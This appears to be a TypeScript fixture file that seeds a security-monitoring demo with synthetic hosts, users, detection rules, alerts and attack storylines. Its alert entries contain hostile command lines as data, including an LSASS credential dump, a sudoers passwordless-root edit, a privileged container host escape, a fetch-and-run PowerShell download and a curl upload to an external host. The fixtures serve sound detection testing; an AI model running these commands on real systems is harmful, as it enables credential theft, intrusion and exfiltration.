import { timeAt, uuidv5 } from './utils.ts';

export type Criticality = 'low_impact' | 'medium_impact' | 'high_impact' | 'extreme_impact';
export type Storyline = 'S1' | 'S2' | 'S3' | 'noise';
export type HostOs = 'windows' | 'linux';
export type LogonKind = 'win_interactive' | 'win_rdp' | 'ssh';

export const DOMAIN = 'acme.example';

export interface ScenarioHost {
  key: string;
  name: string;
  /** Deterministic uuidv5(name); the entity id is `host:<id>`. */
  id: string;
  os: HostOs;
  criticality?: Criticality;
  storyline: Storyline;
}

export interface ScenarioUser {
  key: string;
  userName: string;
  email: string;
  department: string;
  /** Host the user logs on to every day. */
  laptop?: string;
  storyline: Storyline;
  /** Local aliases are linked to the golden IdP identity through the resolution API. */
  resolve: boolean;
  watchlists?: 'privileged'[];
  criticality?: Criticality;
}

export interface ScenarioService {
  name: string;
}

const makeHost = (
  name: string,
  os: HostOs,
  storyline: Storyline,
  criticality?: Criticality,
): ScenarioHost => ({
  key: name,
  name,
  id: uuidv5(name),
  os,
  storyline,
  ...(criticality ? { criticality } : {}),
});

const NOISE_USERS: Array<[string, string]> = [
  ['m.patel', 'Engineering'],
  ['s.kim', 'Engineering'],
  ['t.nguyen', 'Engineering'],
  ['l.garcia', 'Sales'],
  ['r.johnson', 'Sales'],
  ['k.okafor', 'Finance'],
  ['d.schmidt', 'Finance'],
  ['p.rossi', 'Legal'],
  ['e.larsen', 'Legal'],
  ['h.tanaka', 'Operations'],
  ['n.ibrahim', 'Operations'],
  ['o.dubois', 'HR'],
  ['c.silva', 'HR'],
  ['f.moreau', 'Support'],
  ['g.novak', 'Support'],
  ['b.wright', 'Marketing'],
  ['i.petrov', 'Engineering'],
  ['z.ahmed', 'Sales'],
];

const noiseLaptopName = (index: number): string => `LAPTOP-NZ${String(index + 1).padStart(2, '0')}`;

export const HOSTS: ScenarioHost[] = [
  makeHost('LAPTOP-FIN03', 'windows', 'S1', 'medium_impact'),
  makeHost('jump-box-01', 'windows', 'S1', 'high_impact'),
  makeHost('docker-host-prod-01', 'linux', 'S1', 'extreme_impact'),
  makeHost('LAPTOP-MKT07', 'windows', 'S2', 'low_impact'),
  makeHost('build-runner-02', 'linux', 'S3'),
  makeHost('fileserver-03', 'linux', 'S3'),
  ...NOISE_USERS.map(([,], index) => makeHost(noiseLaptopName(index), 'windows', 'noise')),
  makeHost('web-prod-01', 'linux', 'noise'),
  makeHost('file-srv-01', 'linux', 'noise'),
  makeHost('db-prod-02', 'linux', 'noise'),
];

export const USERS: ScenarioUser[] = [
  {
    key: 'a.rodriguez',
    userName: 'a.rodriguez',
    email: `a.rodriguez@${DOMAIN}`,
    department: 'Finance',
    laptop: 'LAPTOP-FIN03',
    storyline: 'S1',
    resolve: true,
    watchlists: ['privileged'],
    criticality: 'high_impact',
  },
  {
    key: 'j.chen',
    userName: 'j.chen',
    email: `j.chen@${DOMAIN}`,
    department: 'Marketing',
    laptop: 'LAPTOP-MKT07',
    storyline: 'S2',
    resolve: true,
  },
  {
    key: 'svc-build',
    userName: 'svc-build',
    email: `svc-build@${DOMAIN}`,
    department: 'Engineering',
    storyline: 'S3',
    resolve: true,
  },
  ...NOISE_USERS.map(
    ([userName, department], index): ScenarioUser => ({
      key: userName,
      userName,
      email: `${userName}@${DOMAIN}`,
      department,
      laptop: noiseLaptopName(index),
      storyline: 'noise',
      // Only the first four noise users are resolved: the rest stay unresolved local users (B5).
      resolve: index < 4,
    }),
  ),
];

export const SERVICES: ScenarioService[] = [{ name: 'svc-backup' }, { name: 'svc-monitoring' }];

export const hostByKey = (key: string): ScenarioHost => {
  const found = HOSTS.find((h) => h.key === key);
  if (!found) throw new Error(`Unknown scenario host "${key}"`);
  return found;
};

export const userByKey = (key: string): ScenarioUser => {
  const found = USERS.find((u) => u.key === key);
  if (!found) throw new Error(`Unknown scenario user "${key}"`);
  return found;
};

export const hostEuid = (host: ScenarioHost): string => `host:${host.id}`;
export const localUserEuid = (user: ScenarioUser, host: ScenarioHost): string =>
  `user:${user.userName}@${host.id}@local`;
export const idpUserEuid = (user: ScenarioUser): string => `user:${user.email}@okta`;
export const serviceEuid = (service: ScenarioService): string => `service:${service.name}`;

// ---------------------------------------------------------------------------
// Logons
// ---------------------------------------------------------------------------

/** Relationship scan phases (days before the anchor). Metadata first-seen is rebadged to the phase. */
export const RELATIONSHIP_PHASES = [6, 3, 2] as const;
export type RelationshipPhase = (typeof RELATIONSHIP_PHASES)[number];

export interface ScenarioLogon {
  userKey: string;
  hostKey: string;
  kind: LogonKind;
  daysAgo: number;
  hour: number;
  minute: number;
  /** Phase in which the logon is ingested (so first-seen of its edge is that phase). */
  phase: RelationshipPhase;
}

const dailyLogons = (
  userKey: string,
  hostKey: string,
  kind: LogonKind,
  hour: number,
  fromDay = 30,
): ScenarioLogon[] =>
  Array.from({ length: fromDay }, (_, i) => ({
    userKey,
    hostKey,
    kind,
    daysAgo: fromDay - i,
    hour,
    minute: (i * 7) % 50,
    phase: 6 as const,
  }));

export const buildLogons = (): ScenarioLogon[] => {
  const logons: ScenarioLogon[] = [
    ...dailyLogons('a.rodriguez', 'LAPTOP-FIN03', 'win_interactive', 8),
    ...dailyLogons('j.chen', 'LAPTOP-MKT07', 'win_interactive', 9),
    ...dailyLogons('svc-build', 'build-runner-02', 'ssh', 1),
    // First-ever access to the jump box (RDP, D-3) and to the production docker host (SSH, D-2).
    {
      userKey: 'a.rodriguez',
      hostKey: 'jump-box-01',
      kind: 'win_rdp',
      daysAgo: 3,
      hour: 21,
      minute: 41,
      phase: 3,
    },
    {
      userKey: 'a.rodriguez',
      hostKey: 'jump-box-01',
      kind: 'win_rdp',
      daysAgo: 3,
      hour: 22,
      minute: 12,
      phase: 3,
    },
    {
      userKey: 'a.rodriguez',
      hostKey: 'docker-host-prod-01',
      kind: 'ssh',
      daysAgo: 2,
      hour: 20,
      minute: 37,
      phase: 2,
    },
    {
      userKey: 'a.rodriguez',
      hostKey: 'docker-host-prod-01',
      kind: 'ssh',
      daysAgo: 2,
      hour: 21,
      minute: 5,
      phase: 2,
    },
    // S3: svc-build reaches the file server (first seen D-3).
    {
      userKey: 'svc-build',
      hostKey: 'fileserver-03',
      kind: 'ssh',
      daysAgo: 3,
      hour: 2,
      minute: 14,
      phase: 3,
    },
    {
      userKey: 'svc-build',
      hostKey: 'fileserver-03',
      kind: 'ssh',
      daysAgo: 3,
      hour: 2,
      minute: 40,
      phase: 3,
    },
  ];

  const noiseUsers = USERS.filter((u) => u.storyline === 'noise');
  noiseUsers.forEach((user, index) => {
    if (!user.laptop) return;
    logons.push(...dailyLogons(user.key, user.laptop, 'win_interactive', 8 + (index % 3)));
  });
  // Three noise users touch one distinct server each, a couple of times (infrequent edges, no shared hub).
  const serverTouches: Array<[string, string]> = [
    ['m.patel', 'web-prod-01'],
    ['s.kim', 'file-srv-01'],
    ['t.nguyen', 'db-prod-02'],
  ];
  serverTouches.forEach(([userKey, hostKey], index) => {
    logons.push(
      { userKey, hostKey, kind: 'ssh', daysAgo: 18 - index, hour: 11, minute: 5, phase: 6 },
      { userKey, hostKey, kind: 'ssh', daysAgo: 9 - index, hour: 15, minute: 20, phase: 6 },
    );
  });
  return logons;
};

export const logonTimestamp = (anchor: Date, logon: ScenarioLogon): Date =>
  timeAt(anchor, logon.daysAgo, logon.hour, logon.minute);

// ---------------------------------------------------------------------------
// Rules
// ---------------------------------------------------------------------------

export interface ScenarioRule {
  key: string;
  /** Prebuilt rule_id (detection-rules); looked up by name when the package carries a different id. */
  ruleId: string;
  name: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  riskScore: number;
  type: 'eql' | 'query' | 'esql' | 'new_terms';
  tactic: { id: string; name: string };
  technique: { id: string; name: string };
  subTechnique?: { id: string; name: string };
  integrations: string[];
  /** Enable the rule in Kibana (rules whose integration is missing count as enabled but not working). */
  enable: boolean;
  /** Keep the v18 tactic name ("Defense Evasion") on alerts from this rule to exercise aliasing. */
  forceV18TacticName?: boolean;
  /** Alerts carry no rule threat, only ECS threat.* (external EDR promotion). */
  noRuleThreat?: boolean;
}

export const RULES: ScenarioRule[] = [
  {
    key: 'office_child',
    ruleId: 'a624863f-a70d-417f-a7d2-7a404638d47f',
    name: 'Suspicious MS Office Child Process',
    severity: 'medium',
    riskScore: 47,
    type: 'eql',
    tactic: { id: 'TA0001', name: 'Initial Access' },
    technique: { id: 'T1566', name: 'Phishing' },
    subTechnique: { id: 'T1566.001', name: 'Spearphishing Attachment' },
    integrations: ['endpoint', 'windows', 'system'],
    enable: true,
  },
  {
    key: 'lsass',
    ruleId: '9960432d-9b26-409f-972b-839a959e79e2',
    name: 'Potential Credential Access via LSASS Memory Dump',
    severity: 'high',
    riskScore: 73,
    type: 'eql',
    tactic: { id: 'TA0006', name: 'Credential Access' },
    technique: { id: 'T1003', name: 'OS Credential Dumping' },
    subTechnique: { id: 'T1003.001', name: 'LSASS Memory' },
    integrations: ['windows'],
    enable: true,
  },
  {
    key: 'sharprdp',
    ruleId: '8c81e506-6e82-4884-9b9a-75d3d252f967',
    name: 'Potential SharpRDP Behavior',
    severity: 'high',
    riskScore: 73,
    type: 'eql',
    tactic: { id: 'TA0008', name: 'Lateral Movement' },
    technique: { id: 'T1021', name: 'Remote Services' },
    subTechnique: { id: 'T1021.001', name: 'Remote Desktop Protocol' },
    integrations: ['endpoint'],
    enable: true,
  },
  {
    // Enabled, but its integrations (network_traffic, panw, zeek...) are NOT installed: no alerts, not working.
    key: 'rdp_internet',
    ruleId: '8c1bdde8-4204-45c0-9e0c-c85ca3902488',
    name: 'RDP (Remote Desktop Protocol) from the Internet',
    severity: 'medium',
    riskScore: 47,
    type: 'query',
    tactic: { id: 'TA0008', name: 'Lateral Movement' },
    technique: { id: 'T1021', name: 'Remote Services' },
    subTechnique: { id: 'T1021.001', name: 'Remote Desktop Protocol' },
    integrations: ['network_traffic', 'panw', 'zeek'],
    enable: true,
  },
  {
    key: 'sudoers',
    ruleId: '931e25a5-0f5e-4ae0-ba0d-9e94eff7e3a4',
    name: 'Sudoers File Activity',
    severity: 'medium',
    riskScore: 47,
    type: 'eql',
    tactic: { id: 'TA0004', name: 'Privilege Escalation' },
    technique: { id: 'T1548', name: 'Abuse Elevation Control Mechanism' },
    subTechnique: { id: 'T1548.003', name: 'Sudo and Sudo Caching' },
    integrations: ['endpoint'],
    enable: true,
  },
  {
    key: 'priv_container',
    ruleId: 'd1f310cb-5921-4d37-bbdf-cfdab7a6df9c',
    name: 'Privileged Container Creation with Host Directory Mount',
    severity: 'high',
    riskScore: 73,
    type: 'eql',
    tactic: { id: 'TA0002', name: 'Execution' },
    technique: { id: 'T1610', name: 'Deploy Container' },
    integrations: ['endpoint', 'auditd_manager'],
    enable: true,
  },
  {
    // External EDR promotion: the rule has no MITRE mapping; alerts only carry ECS threat.tactic.id.
    key: 'external_alerts',
    ruleId: 'eb079c62-4481-4d6e-9643-3ca499df7aaa',
    name: 'External Alerts',
    severity: 'high',
    riskScore: 73,
    type: 'query',
    tactic: { id: 'TA0008', name: 'Lateral Movement' },
    technique: { id: 'T1021', name: 'Remote Services' },
    integrations: [],
    enable: false,
    noRuleThreat: true,
  },
  {
    key: 'okta_mfa',
    ruleId: '8a0fbd26-867f-11ee-947c-f661ea17fbcd',
    name: 'Potential Okta MFA Bombing via Push Notifications',
    severity: 'high',
    riskScore: 73,
    type: 'eql',
    tactic: { id: 'TA0006', name: 'Credential Access' },
    technique: { id: 'T1621', name: 'Multi-Factor Authentication Request Generation' },
    integrations: ['okta'],
    enable: true,
  },
  {
    key: 'okta_impersonation',
    ruleId: 'cdbebdc1-dc97-43c6-a538-f26a20c0a911',
    name: 'Okta User Session Impersonation',
    severity: 'high',
    riskScore: 73,
    type: 'query',
    tactic: { id: 'TA0006', name: 'Credential Access' },
    technique: { id: 'T1550', name: 'Use Alternate Authentication Material' },
    integrations: ['okta'],
    enable: true,
  },
  {
    key: 'ssh_spray',
    ruleId: '9e81b1fd-e9fb-49a7-8ebe-0d1a14090142',
    name: 'Potential Password Spraying Attack via SSH',
    severity: 'low',
    riskScore: 21,
    type: 'esql',
    tactic: { id: 'TA0006', name: 'Credential Access' },
    technique: { id: 'T1110', name: 'Brute Force' },
    subTechnique: { id: 'T1110.003', name: 'Password Spraying' },
    integrations: ['system'],
    enable: true,
  },
  {
    key: 'curl_exfil',
    ruleId: 'be70614d-4295-473c-a953-582aef41c865',
    name: 'Potential Data Exfiltration Through Curl',
    severity: 'medium',
    riskScore: 47,
    type: 'eql',
    tactic: { id: 'TA0010', name: 'Exfiltration' },
    technique: { id: 'T1048', name: 'Exfiltration Over Alternative Protocol' },
    integrations: ['endpoint'],
    enable: true,
  },
  // Noise rules (low / medium, mixed tactics)
  {
    key: 'whoami',
    ruleId: 'ef862985-3f13-4262-a686-5f357bbb9bc2',
    name: 'Whoami Process Activity',
    severity: 'low',
    riskScore: 21,
    type: 'eql',
    tactic: { id: 'TA0007', name: 'Discovery' },
    technique: { id: 'T1033', name: 'System Owner/User Discovery' },
    integrations: ['endpoint', 'windows', 'system'],
    enable: true,
  },
  {
    key: 'admin_recon',
    ruleId: '871ea072-1b71-4def-b016-6278b505138d',
    name: 'Enumeration of Administrator Accounts',
    severity: 'low',
    riskScore: 21,
    type: 'eql',
    tactic: { id: 'TA0007', name: 'Discovery' },
    technique: { id: 'T1087', name: 'Account Discovery' },
    integrations: ['endpoint', 'windows', 'system'],
    enable: true,
  },
  {
    key: 'lolbin',
    ruleId: '63e65ec3-43b1-45b0-8f2d-45b34291dc44',
    name: 'Network Connection via Signed Binary',
    severity: 'low',
    riskScore: 21,
    type: 'eql',
    tactic: { id: 'TA0005', name: 'Defense Evasion' },
    technique: { id: 'T1218', name: 'System Binary Proxy Execution' },
    integrations: ['endpoint', 'windows'],
    enable: true,
  },
  {
    // The one v18-named rule: alerts keep the "Defense Evasion" tactic name to exercise v18 -> v19 aliasing.
    key: 'clear_logs',
    ruleId: 'd331bbe2-6db4-4941-80a5-8270db72eb61',
    name: 'Clearing Windows Event Logs',
    severity: 'low',
    riskScore: 21,
    type: 'eql',
    tactic: { id: 'TA0005', name: 'Defense Evasion' },
    technique: { id: 'T1070', name: 'Indicator Removal' },
    subTechnique: { id: 'T1070.001', name: 'Clear Windows Event Logs' },
    integrations: ['endpoint', 'windows'],
    enable: true,
    forceV18TacticName: true,
  },
  {
    key: 'powershell_imgload',
    ruleId: '852c1f19-68e8-43a6-9dce-340771fe1be3',
    name: 'Suspicious PowerShell Engine ImageLoad',
    severity: 'medium',
    riskScore: 47,
    type: 'new_terms',
    tactic: { id: 'TA0002', name: 'Execution' },
    technique: { id: 'T1059', name: 'Command and Scripting Interpreter' },
    subTechnique: { id: 'T1059.001', name: 'PowerShell' },
    integrations: ['endpoint', 'windows'],
    enable: true,
  },
];

export const ruleByKey = (key: string): ScenarioRule => {
  const found = RULES.find((r) => r.key === key);
  if (!found) throw new Error(`Unknown scenario rule "${key}"`);
  return found;
};

// ---------------------------------------------------------------------------
// Alerts
// ---------------------------------------------------------------------------

export type AlertStatus = 'open' | 'acknowledged' | 'closed';

export interface ScenarioAlert {
  key: string;
  storyline: Storyline;
  ruleKey: string;
  daysAgo: number;
  hour: number;
  minute: number;
  hostKey?: string;
  userKey: string;
  /** `local`: host-scoped alias (host + user); `idp`: user-only alert on the IdP identity. */
  userScope: 'local' | 'idp';
  status: AlertStatus;
  process?: { name: string; parent?: string; commandLine: string };
  reason: string;
  /** ECS threat.* only (external EDR promotion); no rule threat. */
  ecsThreatOnly?: boolean;
}

const alert = (a: ScenarioAlert): ScenarioAlert => a;

export const S1_ALERTS: ScenarioAlert[] = [
  alert({
    key: 's1-ia',
    storyline: 'S1',
    ruleKey: 'office_child',
    daysAgo: 5,
    hour: 14,
    minute: 22,
    hostKey: 'LAPTOP-FIN03',
    userKey: 'a.rodriguez',
    userScope: 'local',
    status: 'open',
    process: {
      name: 'powershell.exe',
      parent: 'WINWORD.EXE',
      commandLine:
        'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ==',
    },
    reason: 'Word spawned an encoded PowerShell child after opening Q3_invoice.docm',
  }),
  alert({
    key: 's1-ca',
    storyline: 'S1',
    ruleKey: 'lsass',
    daysAgo: 4,
    hour: 10,
    minute: 8,
    hostKey: 'LAPTOP-FIN03',
    userKey: 'a.rodriguez',
    userScope: 'local',
    status: 'open',
    process: {
      name: 'rundll32.exe',
      parent: 'powershell.exe',
      commandLine:
        'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 724 C:\\Users\\Public\\l.dmp full',
    },
    reason: 'LSASS memory was dumped with comsvcs.dll MiniDump',
  }),
  alert({
    key: 's1-lm',
    storyline: 'S1',
    ruleKey: 'sharprdp',
    daysAgo: 3,
    hour: 22,
    minute: 19,
    hostKey: 'jump-box-01',
    userKey: 'a.rodriguez',
    userScope: 'local',
    status: 'open',
    process: {
      name: 'mstsc.exe',
      parent: 'cmd.exe',
      commandLine: 'SharpRDP.exe computername=docker-host-prod-01 command="cmd /c whoami"',
    },
    reason: 'SharpRDP-style remote command execution from jump-box-01',
  }),
  alert({
    key: 's1-lm-edr',
    storyline: 'S1',
    ruleKey: 'external_alerts',
    daysAgo: 3,
    hour: 22,
    minute: 31,
    hostKey: 'jump-box-01',
    userKey: 'a.rodriguez',
    userScope: 'local',
    status: 'open',
    ecsThreatOnly: true,
    process: { name: 'mstsc.exe', parent: 'explorer.exe', commandLine: 'mstsc.exe /v:10.20.4.17' },
    reason: 'EDR alert promoted from an external source: lateral movement over RDP',
  }),
  alert({
    key: 's1-pe',
    storyline: 'S1',
    ruleKey: 'sudoers',
    daysAgo: 2,
    hour: 21,
    minute: 14,
    hostKey: 'docker-host-prod-01',
    userKey: 'a.rodriguez',
    userScope: 'local',
    status: 'open',
    process: {
      name: 'sudo',
      parent: 'bash',
      commandLine: 'sudo sh -c \'echo "a.rodriguez ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\'',
    },
    reason: 'The sudoers file was modified to grant passwordless sudo',
  }),
  alert({
    key: 's1-exec',
    storyline: 'S1',
    ruleKey: 'priv_container',
    daysAgo: 1,
    hour: 9,
    minute: 3,
    hostKey: 'docker-host-prod-01',
    userKey: 'a.rodriguez',
    userScope: 'local',
    status: 'open',
    process: {
      name: 'docker',
      parent: 'bash',
      commandLine: 'docker run --privileged -v /:/host -it alpine chroot /host sh',
    },
    reason: 'A privileged container was created with the host root mounted',
  }),
];

export const S2_ALERTS: ScenarioAlert[] = [
  alert({
    key: 's2-mfa',
    storyline: 'S2',
    ruleKey: 'okta_mfa',
    daysAgo: 3,
    hour: 11,
    minute: 2,
    userKey: 'j.chen',
    userScope: 'idp',
    status: 'acknowledged',
    reason: 'Okta MFA push notifications flooded j.chen within minutes',
  }),
  alert({
    key: 's2-hijack',
    storyline: 'S2',
    ruleKey: 'okta_impersonation',
    daysAgo: 3,
    hour: 11,
    minute: 40,
    userKey: 'j.chen',
    userScope: 'idp',
    status: 'acknowledged',
    reason: 'An Okta session for j.chen was used from a new device and location',
  }),
  alert({
    key: 's2-office',
    storyline: 'S2',
    ruleKey: 'office_child',
    daysAgo: 2,
    hour: 15,
    minute: 11,
    hostKey: 'LAPTOP-MKT07',
    userKey: 'j.chen',
    userScope: 'local',
    status: 'acknowledged',
    process: {
      name: 'cmd.exe',
      parent: 'EXCEL.EXE',
      commandLine: 'cmd.exe /c curl -s http://198.51.100.23/a.ps1 | powershell -',
    },
    reason: 'Excel spawned a command shell on LAPTOP-MKT07',
  }),
];

export const S3_ALERTS: ScenarioAlert[] = [
  alert({
    key: 's3-spray',
    storyline: 'S3',
    ruleKey: 'ssh_spray',
    daysAgo: 4,
    hour: 3,
    minute: 12,
    hostKey: 'build-runner-02',
    userKey: 'svc-build',
    userScope: 'local',
    status: 'open',
    reason: 'Repeated SSH password attempts against svc-build from one source',
  }),
  alert({
    key: 's3-exfil',
    storyline: 'S3',
    ruleKey: 'curl_exfil',
    daysAgo: 2,
    hour: 2,
    minute: 51,
    hostKey: 'build-runner-02',
    userKey: 'svc-build',
    userScope: 'local',
    status: 'open',
    process: {
      name: 'curl',
      parent: 'bash',
      commandLine: 'curl -T /srv/build/artifacts.tgz https://files.example-drop.net/upload',
    },
    reason: 'curl uploaded a large archive to an external host from build-runner-02',
  }),
];

const variant = (
  base: ScenarioAlert,
  key: string,
  patch: Partial<ScenarioAlert>,
): ScenarioAlert => ({ ...base, ...patch, key });

// Repeat detections so the real risk engine lifts the S1 and S2 identities to High / Critical
// (material risk) rather than a single alert each.
S1_ALERTS.push(
  variant(S1_ALERTS[1], 's1-ca-2', { hour: 15, minute: 40 }),
  variant(S1_ALERTS[2], 's1-lm-2', { hour: 23, minute: 5 }),
  variant(S1_ALERTS[2], 's1-lm-3', { daysAgo: 2, hour: 8, minute: 20 }),
  variant(S1_ALERTS[4], 's1-pe-2', { daysAgo: 2, hour: 22, minute: 2 }),
  variant(S1_ALERTS[5], 's1-exec-2', { hour: 11, minute: 30 }),
  variant(S1_ALERTS[5], 's1-exec-3', { hour: 14, minute: 12 }),
);
S2_ALERTS.push(
  variant(S2_ALERTS[0], 's2-mfa-2', { minute: 18 }),
  variant(S2_ALERTS[0], 's2-mfa-3', { minute: 29 }),
  variant(S2_ALERTS[1], 's2-hijack-2', { hour: 13, minute: 5 }),
  variant(S2_ALERTS[2], 's2-office-2', { hour: 16, minute: 3 }),
);

const NOISE_ALERT_PLAN: Array<[string, number, string]> = [
  // [noise rule key, days ago, status]
  ['whoami', 28, 'closed'],
  ['admin_recon', 26, 'open'],
  ['lolbin', 24, 'closed'],
  ['clear_logs', 21, 'open'],
  ['powershell_imgload', 20, 'open'],
  ['whoami', 17, 'open'],
  ['admin_recon', 14, 'closed'],
  ['lolbin', 12, 'open'],
  ['clear_logs', 10, 'open'],
  ['powershell_imgload', 8, 'open'],
  ['whoami', 7, 'closed'],
  ['admin_recon', 5, 'open'],
  ['lolbin', 4, 'open'],
  ['powershell_imgload', 2, 'open'],
];

export const buildNoiseAlerts = (): ScenarioAlert[] => {
  const noiseUsers = USERS.filter((u) => u.storyline === 'noise');
  // Start after the first four resolved users so noise alerts land mostly on unresolved aliases.
  return NOISE_ALERT_PLAN.map(([ruleKey, daysAgo, status], index): ScenarioAlert => {
    const user = noiseUsers[(index + 4) % noiseUsers.length];
    return {
      key: `noise-${index + 1}`,
      storyline: 'noise',
      ruleKey,
      daysAgo,
      hour: 9 + (index % 8),
      minute: (index * 11) % 60,
      hostKey: user.laptop,
      userKey: user.key,
      userScope: 'local',
      status: status as AlertStatus,
      reason: `${ruleByKey(ruleKey).name} on ${user.laptop ?? 'host'}`,
    };
  });
};

export const buildAlerts = (): ScenarioAlert[] => [
  ...buildNoiseAlerts(),
  ...S3_ALERTS,
  ...S2_ALERTS,
  ...S1_ALERTS,
];

/** Days (before the anchor) on which the real risk engine is run and its docs rebadged to the day. */
export const RISK_DAYS = [20, 10, 5, 4, 3, 2, 1] as const;

// ---------------------------------------------------------------------------
// Narratives
// ---------------------------------------------------------------------------

export interface ScenarioDiscovery {
  key: string;
  storyline: Storyline;
  alertKeys: string[];
  title: string;
  summaryMarkdown: string;
  detailsMarkdown: string;
  entitySummaryMarkdown: string;
  mitreAttackTactics: string[];
  daysAgo: number;
  hour: number;
}

export const DISCOVERIES: ScenarioDiscovery[] = [
  {
    key: 's1-discovery',
    storyline: 'S1',
    alertKeys: S1_ALERTS.map((a) => a.key),
    title: 'Stolen privileged credentials used to reach a production container host',
    summaryMarkdown:
      'A.rodriguez {{ user.name a.rodriguez }} opened a malicious document on {{ host.name LAPTOP-FIN03 }}, dumped credentials, moved to {{ host.name jump-box-01 }} over RDP and escalated privileges on {{ host.name docker-host-prod-01 }}, where a privileged container with the host root mounted was started.',
    detailsMarkdown:
      '- Initial access: Word spawned encoded PowerShell on {{ host.name LAPTOP-FIN03 }}\n' +
      '- Credential access: LSASS was dumped on the same laptop\n' +
      '- Lateral movement: first-ever RDP session to {{ host.name jump-box-01 }}, then an SSH session to {{ host.name docker-host-prod-01 }}\n' +
      '- Privilege escalation: sudoers modified on {{ host.name docker-host-prod-01 }}\n' +
      '- Execution: privileged container creation with the host directory mounted',
    entitySummaryMarkdown:
      'User {{ user.name a.rodriguez }} on hosts {{ host.name LAPTOP-FIN03 }}, {{ host.name jump-box-01 }}, {{ host.name docker-host-prod-01 }}',
    mitreAttackTactics: [
      'Initial Access',
      'Credential Access',
      'Lateral Movement',
      'Privilege Escalation',
      'Execution',
    ],
    daysAgo: 1,
    hour: 10,
  },
  {
    key: 's2-discovery',
    storyline: 'S2',
    alertKeys: S2_ALERTS.map((a) => a.key),
    title: 'MFA fatigue followed by session hijack of a marketing account',
    summaryMarkdown:
      'J.chen {{ user.name j.chen }} was flooded with MFA push requests, an Okta session was then used from a new device, and a suspicious Office child process ran on {{ host.name LAPTOP-MKT07 }}.',
    detailsMarkdown:
      '- Credential access: MFA push bombing against {{ user.name j.chen }}\n' +
      '- Session hijack: Okta session impersonation\n' +
      '- Execution: Excel spawned a command shell on {{ host.name LAPTOP-MKT07 }}',
    entitySummaryMarkdown: 'User {{ user.name j.chen }} on host {{ host.name LAPTOP-MKT07 }}',
    mitreAttackTactics: ['Credential Access', 'Initial Access', 'Execution'],
    daysAgo: 2,
    hour: 18,
  },
];

export const S2_CASE = {
  title: 'Marketing account takeover: j.chen',
  description:
    'Investigating MFA fatigue and session hijack for j.chen. Account reset requested, laptop LAPTOP-MKT07 isolated.',
  daysAgo: 1,
  hour: 9,
} as const;

export interface ScenarioVulnerability {
  hostKey: string;
  cve: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  title: string;
}

export const VULNERABILITIES: ScenarioVulnerability[] = [
  {
    hostKey: 'docker-host-prod-01',
    cve: 'CVE-2024-21626',
    severity: 'CRITICAL',
    title: 'runc: container breakout through process.cwd and leaked fds',
  },
  {
    hostKey: 'docker-host-prod-01',
    cve: 'CVE-2025-31133',
    severity: 'CRITICAL',
    title: 'runc: maskedPaths abuse allows host file access',
  },
  {
    hostKey: 'docker-host-prod-01',
    cve: 'CVE-2024-45337',
    severity: 'HIGH',
    title: 'golang.org/x/crypto: misuse of ServerConfig.PublicKeyCallback',
  },
  {
    hostKey: 'jump-box-01',
    cve: 'CVE-2024-38077',
    severity: 'HIGH',
    title: 'Windows Remote Desktop Licensing Service remote code execution',
  },
  {
    hostKey: 'build-runner-02',
    cve: 'CVE-2024-6387',
    severity: 'HIGH',
    title: 'OpenSSH regreSSHion race condition',
  },
  {
    hostKey: 'web-prod-01',
    cve: 'CVE-2024-3094',
    severity: 'MEDIUM',
    title: 'xz: malicious code in upstream tarballs',
  },
  {
    hostKey: 'file-srv-01',
    cve: 'CVE-2023-4911',
    severity: 'MEDIUM',
    title: 'glibc: buffer overflow in ld.so (Looney Tunables)',
  },
];
